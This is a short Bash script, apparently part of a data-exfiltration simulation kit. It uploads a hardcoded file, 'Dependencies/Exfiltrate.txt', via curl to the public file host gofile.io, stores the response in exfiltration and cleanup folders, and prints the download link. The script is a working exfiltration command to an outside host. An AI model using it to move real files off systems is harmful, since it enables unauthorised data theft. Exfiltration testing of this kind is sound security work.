# Hardcoded file path to upload
FILE_PATH="Dependencies/Exfiltrate.txt"

if [[ ! -f "$FILE_PATH" ]]; then
  echo "File not found: $FILE_PATH"
  exit 1
fi

response=$(curl -s -X POST "https://upload.gofile.io/uploadfile" \
  -F "file=@$FILE_PATH")

echo "Response:"
echo "$response" > Output/Exfiltration/gofile_response.json
echo "$response" | jq 

#cp gofile_response.json Output/Exfiltration/gofile_response.json
cp Output/Exfiltration/gofile_response.json Cleanup/gofile_response.json

# Extract download and delete URLs from response JSON
download_link=$(echo "$response" | grep -oP '"downloadPage":"\K[^"]+')

if [[ -n "$download_link" ]]; then
  echo "[+] Download link: $download_link"
else
  echo "[-] Download link not found."
fi
